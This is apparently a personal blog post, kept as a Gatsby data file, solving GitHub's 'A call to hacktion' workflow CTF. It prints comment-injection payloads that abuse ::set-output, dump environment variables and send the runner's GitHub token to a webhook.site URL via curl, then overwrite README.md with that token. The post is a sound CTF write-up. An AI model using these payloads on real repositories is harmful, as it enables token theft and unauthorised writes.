module.exports = {"data":{"post":{"id":"/home/runner/work/isnackable.github.io/isnackable.github.io/content/posts/2021-03-24--A-call-to-hacktion-a-github-workflow-ctf/index.md absPath of file >>> MarkdownRemark","html":"<h2>Introduction</h2>\n<p>“A call to hacktion, a GitHub workflow CTF” is a single level challenge based around GitHub Workflow best practices and an interesting vulnerability pattern that GitHub Security teams have seen out in the real world.</p>\n<p>To solve the game, you will have to elevate your privileges from read-only to full write access on a designated game repository!</p>\n<h2>My Process</h2>\n<p>Okay, so we know that this challenge resolves around the GitHub Workflow, the vulnerability is probably in the workflow file.</p>\n<h4>Content of <strong>comment-logger.yml</strong>:</h4>\n<div class=\"gatsby-highlight\" data-language=\"yml\">\n      <pre class=\"language-yml\"><code class=\"language-yml\">name: log and process issue comments\non:\n  issue_comment:\n    types: [created]\n\njobs:\n  issue_comment:\n    name: log issue comment\n    runs-on: ubuntu-latest\n    steps:\n      - id: comment_log\n        name: log issue comment\n        uses: actions/github-script@v3\n        env:\n          COMMENT_BODY: ${{ github.event.comment.body }}\n          COMMENT_ID: ${{ github.event.comment.id }}\n        with:\n          github-token: &quot;deadc0de&quot;\n          script: |\n            console.log(process.env.COMMENT_BODY)\n            return process.env.COMMENT_ID\n          result-encoding: string\n      - id: comment_process\n        name: process comment\n        uses: actions/github-script@v3\n        timeout-minutes: 1\n        if: ${{ steps.comment_log.outputs.COMMENT_ID }}\n        with:\n          script: |\n            const id = ${{ steps.comment_log.outputs.COMMENT_ID }}\n            return &quot;&quot;\n          result-encoding: string</code></pre>\n      </div>\n<p>As it was my first time working with GitHub workflow, I needed to understand how GitHub workflow works. I googled the workflow syntax for github actions to understand the workflow configuration. </p>\n<p>Link: <a href=\"https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions\">https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions</a></p>\n<p>After reading the syntax, I realised this this workflow will the process describe in the workflow configuration when there is a new comment on an issue. With that knowledge, I figured that I should create a new issue and play around and see the logs on the workflow.</p>\n<p>\n  <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-9058b.jpeg\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n  \n  <span\n    class=\"gatsby-resp-image-wrapper\"\n    style=\"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;\"\n  >\n    <span\n      class=\"gatsby-resp-image-background-image\"\n      style=\"padding-bottom: 49.27293064876958%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,'); background-size: cover; display: block;\"\n    >\n      <img\n        class=\"gatsby-resp-image-image\"\n        style=\"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;\"\n        alt=\"new-issue\"\n        title=\"\"\n        src=\"/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-78f2b.jpeg\"\n        srcset=\"/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-dce19.jpeg 200w,\n/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-c1413.jpeg 400w,\n/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-78f2b.jpeg 800w,\n/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-ab4c4.jpeg 1200w,\n/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-bc99b.jpeg 1600w,\n/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-9058b.jpeg 1788w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>Then I proceed to make a new commnet under the newly created issue, “test issue”. I noticed that an action was ran after my comment, so I clicked on the action and tried to see the log.</p>\n<p>\n  <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/github-action-log-89740de04244b91879d06e6fc0359f7f-9058b.jpeg\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n  \n  <span\n    class=\"gatsby-resp-image-wrapper\"\n    style=\"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;\"\n  >\n    <span\n      class=\"gatsby-resp-image-background-image\"\n      style=\"padding-bottom: 49.27293064876958%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,'); background-size: cover; display: block;\"\n    >\n      <img\n        class=\"gatsby-resp-image-image\"\n        style=\"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;\"\n        alt=\"github-action-log\"\n        title=\"\"\n        src=\"/static/github-action-log-89740de04244b91879d06e6fc0359f7f-78f2b.jpeg\"\n        srcset=\"/static/github-action-log-89740de04244b91879d06e6fc0359f7f-dce19.jpeg 200w,\n/static/github-action-log-89740de04244b91879d06e6fc0359f7f-c1413.jpeg 400w,\n/static/github-action-log-89740de04244b91879d06e6fc0359f7f-78f2b.jpeg 800w,\n/static/github-action-log-89740de04244b91879d06e6fc0359f7f-ab4c4.jpeg 1200w,\n/static/github-action-log-89740de04244b91879d06e6fc0359f7f-bc99b.jpeg 1600w,\n/static/github-action-log-89740de04244b91879d06e6fc0359f7f-9058b.jpeg 1788w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>So I realised that my comment is a user input that I can control, which may or may not be the vulnerability. As this is my only lead, I went ahead and googled more GitHub actions workflow releated stuff, and I came across a GitHub Security Lab blog post about untrusted input.</p>\n<p>Link: <a href=\"https://securitylab.github.com/research/github-actions-untrusted-input\">https://securitylab.github.com/research/github-actions-untrusted-input</a></p>\n<div class=\"gatsby-highlight\" data-language=\"yml\">\n      <pre class=\"language-yml\"><code class=\"language-yml\">- id: comment_log\nenv:\n    COMMENT_BODY: ${{ github.event.comment.body }} // I CAN CONTROL\n    COMMENT_ID: ${{ github.event.comment.id }}\n    script: |\n    console.log(process.env.COMMENT_BODY) // MY INPUT, CAN I INJECT CODE HERE?\n    return process.env.COMMENT_ID\n    result-encoding: string\n\n- id: comment_process\nif: ${{ steps.comment_log.outputs.COMMENT_ID }}\nwith:\n    script: |\n    const id = ${{ steps.comment_log.outputs.COMMENT_ID }}\n    return &quot;&quot;\n    result-encoding: string</code></pre>\n      </div>\n<p>Looking at the workflow file again, I see that my input (<em>comment_body</em>), is flows to <code class=\"language-text\">console.log(process.env.COMMENT_BODY)</code>. My first initial thought is that I could potential inject javascript code here. To test my theory, I tried inputing quotes, <code class=\"language-text\">&#39;</code> and <code class=\"language-text\">&quot;</code> to see if there is any error generated. </p>\n<p>And did it work? Of course that didn’t work, it would have been too easy if it did. Afterwards, I thought to try out some of the steps written in the GitHub Security Lab blog post about untrusted input. I tried template injection, but that didn’t work as there is no template here.</p>\n<p>Sadly, I was stuck here for a long time, just spamming and hoping for an error to pop out. I decided to continue googling GitHub actions/workflow, to see if I could find anything of interest. </p>\n<p>Which somehow, I did. I found out that there is something called “workflow command”, not sure what that is, I read the website and noticed that a workflow command was passed in a <code class=\"language-text\">console.log</code>. I tried doing the same thing just to see what will happen.</p>\n<p>Link: <a href=\"https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions\">https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions</a></p>\n<p>My input: <code class=\"language-text\">::save-state name=processID::12345</code>. This workflow command create environment variables named STATE<em>processID with the value of 12345. I thought that this command could modify the COMMAND</em>ID, so I replace “processID” with “COMMAND<em>ID”. Spoiler alert, it didn’t. Why not? That’s because this command created an enviroment variable and prepend “STATE</em>“.</p>\n<div class=\"gatsby-highlight\" data-language=\"yml\">\n      <pre class=\"language-yml\"><code class=\"language-yml\">if: ${{ steps.comment_log.outputs.COMMENT_ID }}</code></pre>\n      </div>\n<p>Back to the workflow file again, I noticed that if I wanted the next step to run, the commet<em>log needed to output the COMMENT</em>ID, right? Note: <em>Not really, <code class=\"language-text\">steps.comment_log.outputs.COMMENT_ID</code> is actually just the value of the output from the comment_log step.</em></p>\n<p>With that, I’m going to skip my painstaking redundant effort to try to get “COMMNET<em>BODY” to be the value of “COMMENT</em>ID”.</p>\n<p>Now, another workflow command is <code class=\"language-text\">::set-output name=action_fruit::strawberry</code>. This workflow command set the value output of “action<em>fruit” to “strawberry”. Understanding this command, I tried to set the output value of commnet</em>log, “COMMNET_ID” to “true” after learning that expression in the <code class=\"language-text\">if</code> statement will be evaluated as an expression. </p>\n<p>My input: <code class=\"language-text\">::set-output name=COMMENT_ID::true</code>. Finally, I started to see progress. Quickly, I know that command injection is possible, as this input is treated as an expression as part of the variable declaration.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\">\n      <pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> id <span class=\"token operator\">=</span> $<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> steps<span class=\"token punctuation\">.</span>comment_log<span class=\"token punctuation\">.</span>outputs<span class=\"token punctuation\">.</span><span class=\"token constant\">COMMENT_ID</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre>\n      </div>\n<p>\n  <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-9058b.jpeg\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n  \n  <span\n    class=\"gatsby-resp-image-wrapper\"\n    style=\"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;\"\n  >\n    <span\n      class=\"gatsby-resp-image-background-image\"\n      style=\"padding-bottom: 52.57270693512305%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,'); background-size: cover; display: block;\"\n    >\n      <img\n        class=\"gatsby-resp-image-image\"\n        style=\"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;\"\n        alt=\"github-action-log-process\"\n        title=\"\"\n        src=\"/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-78f2b.jpeg\"\n        srcset=\"/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-dce19.jpeg 200w,\n/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-c1413.jpeg 400w,\n/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-78f2b.jpeg 800w,\n/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-ab4c4.jpeg 1200w,\n/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-bc99b.jpeg 1600w,\n/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-9058b.jpeg 1788w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>Time to print out the enviroment variables, which contains the GITHUB TOKEN for READ/WRITE access according to the GitHub workflow documentation. My input: <code class=\"language-text\">::set-output name=COMMENT_ID::true ;console.log(process.env);</code>.</p>\n<p>\n  <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-53225.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n  \n  <span\n    class=\"gatsby-resp-image-wrapper\"\n    style=\"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;\"\n  >\n    <span\n      class=\"gatsby-resp-image-background-image\"\n      style=\"padding-bottom: 49.32291666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n    >\n      <img\n        class=\"gatsby-resp-image-image\"\n        style=\"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;\"\n        alt=\"github-action-leak-env\"\n        title=\"\"\n        src=\"/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-48538.png\"\n        srcset=\"/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-bed0f.png 200w,\n/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-5fd34.png 400w,\n/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-48538.png 800w,\n/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-b70ec.png 1200w,\n/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-d134a.png 1600w,\n/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-53225.png 1920w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>However, the GitHub token is masked, therefore we cannot just see it. Also, later on, I would realised the the token is only valid while the action is being run. Therefore, even if I could copy and token, it would be useless later.</p>\n<p>I then used some website to recieve request, thinking that I could append the token as part of the URL, just to validate the token exists. My input: <code class=\"language-text\">::set-output name=COMMENT_ID::true ;const execSync = require(&#39;child_process&#39;).execSync; code = execSync(&#39;curl https://webhook.site/REDACTED?token=&#39; + process.env[&quot;INPUT_GITHUB-TOKEN&quot;]);</code>. I did the same for “ACTIONS<em>RUNTIME</em>TOKEN”.</p>\n<p>After verifying that the token exists, all I had to do is to make a request using GitHub API with the token to commit to the “README.md” file. I spent quite a few time researching the API but the solution is below.</p>\n<h2>My Solution</h2>\n<p><code class=\"language-text\">::set-output name=COMMENT_ID::true ;const execSync = require(&#39;child_process&#39;).execSync; code = execSync(`curl -i --request PUT --url https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/contents/README.md --header &#39;authorization: Bearer ${process.env[&quot;INPUT_GITHUB-TOKEN&quot;]}&#39; --header &#39;content-type: application/json&#39; --data &#39;{ &quot;message&quot;: &quot;PWNED!!!!&quot;, &quot;content&quot;: &quot;V2UgYXJlIGluY3JlZGlibHkgc2VjdXJlISBCdXQgaWYgeW91IGRpc2FncmVlLCBwbGVhc2UgZmlsZSBhIFBSIDopCk5PUEUsIEkgRElTQUdSRUVFRSEh&quot;, &quot;sha&quot;: &quot;959c46eb0fbab9ab5b5bfb279ab6d70f720d1207&quot; }&#39; --fail`);</code></p>\n<p>\n  <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/pwned-024f59b9cb45831ef6006c944d963db9-9058b.jpeg\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n  \n  <span\n    class=\"gatsby-resp-image-wrapper\"\n    style=\"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;\"\n  >\n    <span\n      class=\"gatsby-resp-image-background-image\"\n      style=\"padding-bottom: 49.27293064876958%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,'); background-size: cover; display: block;\"\n    >\n      <img\n        class=\"gatsby-resp-image-image\"\n        style=\"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;\"\n        alt=\"pwned\"\n        title=\"\"\n        src=\"/static/pwned-024f59b9cb45831ef6006c944d963db9-78f2b.jpeg\"\n        srcset=\"/static/pwned-024f59b9cb45831ef6006c944d963db9-dce19.jpeg 200w,\n/static/pwned-024f59b9cb45831ef6006c944d963db9-c1413.jpeg 400w,\n/static/pwned-024f59b9cb45831ef6006c944d963db9-78f2b.jpeg 800w,\n/static/pwned-024f59b9cb45831ef6006c944d963db9-ab4c4.jpeg 1200w,\n/static/pwned-024f59b9cb45831ef6006c944d963db9-bc99b.jpeg 1600w,\n/static/pwned-024f59b9cb45831ef6006c944d963db9-9058b.jpeg 1788w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<h2>Results</h2>\n<p>GitHub Capture the Flag results: <a href=\"https://github.blog/2021-03-22-github-ctf-results/\">https://github.blog/2021-03-22-github-ctf-results/</a></p>\n<p>Note: <em>The results website shows a different step taken to solve this challenge, go ahead and read it as I think it’s nicer and cleaner solution overall compared to mine.</em></p>","htmlAst":{"type":"root","children":[{"type":"element","tagName":"h2","properties":{},"children":[{"type":"text","value":"Introduction"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"“A call to hacktion, a GitHub workflow CTF” is a single level challenge based around GitHub Workflow best practices and an interesting vulnerability pattern that GitHub Security teams have seen out in the real world."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"To solve the game, you will have to elevate your privileges from read-only to full write access on a designated game repository!"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h2","properties":{},"children":[{"type":"text","value":"My Process"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Okay, so we know that this challenge resolves around the GitHub Workflow, the vulnerability is probably in the workflow file."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h4","properties":{},"children":[{"type":"text","value":"Content of "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":"comment-logger.yml"}]},{"type":"text","value":":"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"div","properties":{"className":["gatsby-highlight"],"dataLanguage":"yml"},"children":[{"type":"text","value":"\n      "},{"type":"element","tagName":"pre","properties":{"className":["language-yml"]},"children":[{"type":"element","tagName":"code","properties":{"className":["language-yml"]},"children":[{"type":"text","value":"name: log and process issue comments\non:\n  issue_comment:\n    types: [created]\n\njobs:\n  issue_comment:\n    name: log issue comment\n    runs-on: ubuntu-latest\n    steps:\n      - id: comment_log\n        name: log issue comment\n        uses: actions/github-script@v3\n        env:\n          COMMENT_BODY: ${{ github.event.comment.body }}\n          COMMENT_ID: ${{ github.event.comment.id }}\n        with:\n          github-token: \"deadc0de\"\n          script: |\n            console.log(process.env.COMMENT_BODY)\n            return process.env.COMMENT_ID\n          result-encoding: string\n      - id: comment_process\n        name: process comment\n        uses: actions/github-script@v3\n        timeout-minutes: 1\n        if: ${{ steps.comment_log.outputs.COMMENT_ID }}\n        with:\n          script: |\n            const id = ${{ steps.comment_log.outputs.COMMENT_ID }}\n            return \"\"\n          result-encoding: string"}]}]},{"type":"text","value":"\n      "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"As it was my first time working with GitHub workflow, I needed to understand how GitHub workflow works. I googled the workflow syntax for github actions to understand the workflow configuration. "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Link: "},{"type":"element","tagName":"a","properties":{"href":"https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions"},"children":[{"type":"text","value":"https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions"}]}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"After reading the syntax, I realised this this workflow will the process describe in the workflow configuration when there is a new comment on an issue. With that knowledge, I figured that I should create a new issue and play around and see the logs on the workflow."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"\n  "},{"type":"element","tagName":"a","properties":{"className":["gatsby-resp-image-link"],"href":"/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-9058b.jpeg","style":"display: block","target":"_blank","rel":["noopener"]},"children":[{"type":"text","value":"\n  \n  "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-wrapper"],"style":"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"},"children":[{"type":"text","value":"\n    "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-background-image"],"style":"padding-bottom: 49.27293064876958%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,'); background-size: cover; display: block;"},"children":[{"type":"text","value":"\n      "},{"type":"element","tagName":"img","properties":{"className":["gatsby-resp-image-image"],"style":"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;","alt":"new-issue","title":"","src":"/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-78f2b.jpeg","srcSet":["/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-dce19.jpeg 200w","/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-c1413.jpeg 400w","/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-78f2b.jpeg 800w","/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-ab4c4.jpeg 1200w","/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-bc99b.jpeg 1600w","/static/new-issue-eeb8ea6af9962d288cf36949a605f79a-9058b.jpeg 1788w"],"sizes":["(max-width:","800px)","100vw,","800px"]},"children":[]},{"type":"text","value":"\n    "}]},{"type":"text","value":"\n  "}]},{"type":"text","value":"\n  \n  "}]},{"type":"text","value":"\n    "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Then I proceed to make a new commnet under the newly created issue, “test issue”. I noticed that an action was ran after my comment, so I clicked on the action and tried to see the log."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"\n  "},{"type":"element","tagName":"a","properties":{"className":["gatsby-resp-image-link"],"href":"/static/github-action-log-89740de04244b91879d06e6fc0359f7f-9058b.jpeg","style":"display: block","target":"_blank","rel":["noopener"]},"children":[{"type":"text","value":"\n  \n  "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-wrapper"],"style":"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"},"children":[{"type":"text","value":"\n    "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-background-image"],"style":"padding-bottom: 49.27293064876958%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,'); background-size: cover; display: block;"},"children":[{"type":"text","value":"\n      "},{"type":"element","tagName":"img","properties":{"className":["gatsby-resp-image-image"],"style":"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;","alt":"github-action-log","title":"","src":"/static/github-action-log-89740de04244b91879d06e6fc0359f7f-78f2b.jpeg","srcSet":["/static/github-action-log-89740de04244b91879d06e6fc0359f7f-dce19.jpeg 200w","/static/github-action-log-89740de04244b91879d06e6fc0359f7f-c1413.jpeg 400w","/static/github-action-log-89740de04244b91879d06e6fc0359f7f-78f2b.jpeg 800w","/static/github-action-log-89740de04244b91879d06e6fc0359f7f-ab4c4.jpeg 1200w","/static/github-action-log-89740de04244b91879d06e6fc0359f7f-bc99b.jpeg 1600w","/static/github-action-log-89740de04244b91879d06e6fc0359f7f-9058b.jpeg 1788w"],"sizes":["(max-width:","800px)","100vw,","800px"]},"children":[]},{"type":"text","value":"\n    "}]},{"type":"text","value":"\n  "}]},{"type":"text","value":"\n  \n  "}]},{"type":"text","value":"\n    "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"So I realised that my comment is a user input that I can control, which may or may not be the vulnerability. As this is my only lead, I went ahead and googled more GitHub actions workflow releated stuff, and I came across a GitHub Security Lab blog post about untrusted input."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Link: "},{"type":"element","tagName":"a","properties":{"href":"https://securitylab.github.com/research/github-actions-untrusted-input"},"children":[{"type":"text","value":"https://securitylab.github.com/research/github-actions-untrusted-input"}]}]},{"type":"text","value":"\n"},{"type":"element","tagName":"div","properties":{"className":["gatsby-highlight"],"dataLanguage":"yml"},"children":[{"type":"text","value":"\n      "},{"type":"element","tagName":"pre","properties":{"className":["language-yml"]},"children":[{"type":"element","tagName":"code","properties":{"className":["language-yml"]},"children":[{"type":"text","value":"- id: comment_log\nenv:\n    COMMENT_BODY: ${{ github.event.comment.body }} // I CAN CONTROL\n    COMMENT_ID: ${{ github.event.comment.id }}\n    script: |\n    console.log(process.env.COMMENT_BODY) // MY INPUT, CAN I INJECT CODE HERE?\n    return process.env.COMMENT_ID\n    result-encoding: string\n\n- id: comment_process\nif: ${{ steps.comment_log.outputs.COMMENT_ID }}\nwith:\n    script: |\n    const id = ${{ steps.comment_log.outputs.COMMENT_ID }}\n    return \"\"\n    result-encoding: string"}]}]},{"type":"text","value":"\n      "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Looking at the workflow file again, I see that my input ("},{"type":"element","tagName":"em","properties":{},"children":[{"type":"text","value":"comment_body"}]},{"type":"text","value":"), is flows to "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"console.log(process.env.COMMENT_BODY)"}]},{"type":"text","value":". My first initial thought is that I could potential inject javascript code here. To test my theory, I tried inputing quotes, "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"'"}]},{"type":"text","value":" and "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"\""}]},{"type":"text","value":" to see if there is any error generated. "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"And did it work? Of course that didn’t work, it would have been too easy if it did. Afterwards, I thought to try out some of the steps written in the GitHub Security Lab blog post about untrusted input. I tried template injection, but that didn’t work as there is no template here."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Sadly, I was stuck here for a long time, just spamming and hoping for an error to pop out. I decided to continue googling GitHub actions/workflow, to see if I could find anything of interest. "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Which somehow, I did. I found out that there is something called “workflow command”, not sure what that is, I read the website and noticed that a workflow command was passed in a "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"console.log"}]},{"type":"text","value":". I tried doing the same thing just to see what will happen."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Link: "},{"type":"element","tagName":"a","properties":{"href":"https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions"},"children":[{"type":"text","value":"https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions"}]}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"My input: "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"::save-state name=processID::12345"}]},{"type":"text","value":". This workflow command create environment variables named STATE"},{"type":"element","tagName":"em","properties":{},"children":[{"type":"text","value":"processID with the value of 12345. I thought that this command could modify the COMMAND"}]},{"type":"text","value":"ID, so I replace “processID” with “COMMAND"},{"type":"element","tagName":"em","properties":{},"children":[{"type":"text","value":"ID”. Spoiler alert, it didn’t. Why not? That’s because this command created an enviroment variable and prepend “STATE"}]},{"type":"text","value":"“."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"div","properties":{"className":["gatsby-highlight"],"dataLanguage":"yml"},"children":[{"type":"text","value":"\n      "},{"type":"element","tagName":"pre","properties":{"className":["language-yml"]},"children":[{"type":"element","tagName":"code","properties":{"className":["language-yml"]},"children":[{"type":"text","value":"if: ${{ steps.comment_log.outputs.COMMENT_ID }}"}]}]},{"type":"text","value":"\n      "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Back to the workflow file again, I noticed that if I wanted the next step to run, the commet"},{"type":"element","tagName":"em","properties":{},"children":[{"type":"text","value":"log needed to output the COMMENT"}]},{"type":"text","value":"ID, right? Note: "},{"type":"element","tagName":"em","properties":{},"children":[{"type":"text","value":"Not really, "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"steps.comment_log.outputs.COMMENT_ID"}]},{"type":"text","value":" is actually just the value of the output from the comment_log step."}]}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"With that, I’m going to skip my painstaking redundant effort to try to get “COMMNET"},{"type":"element","tagName":"em","properties":{},"children":[{"type":"text","value":"BODY” to be the value of “COMMENT"}]},{"type":"text","value":"ID”."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Now, another workflow command is "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"::set-output name=action_fruit::strawberry"}]},{"type":"text","value":". This workflow command set the value output of “action"},{"type":"element","tagName":"em","properties":{},"children":[{"type":"text","value":"fruit” to “strawberry”. Understanding this command, I tried to set the output value of commnet"}]},{"type":"text","value":"log, “COMMNET_ID” to “true” after learning that expression in the "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"if"}]},{"type":"text","value":" statement will be evaluated as an expression. "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"My input: "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"::set-output name=COMMENT_ID::true"}]},{"type":"text","value":". Finally, I started to see progress. Quickly, I know that command injection is possible, as this input is treated as an expression as part of the variable declaration."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"div","properties":{"className":["gatsby-highlight"],"dataLanguage":"javascript"},"children":[{"type":"text","value":"\n      "},{"type":"element","tagName":"pre","properties":{"className":["language-javascript"]},"children":[{"type":"element","tagName":"code","properties":{"className":["language-javascript"]},"children":[{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"const"}]},{"type":"text","value":" id "},{"type":"element","tagName":"span","properties":{"className":["token","operator"]},"children":[{"type":"text","value":"="}]},{"type":"text","value":" $"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"{"}]},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"{"}]},{"type":"text","value":" 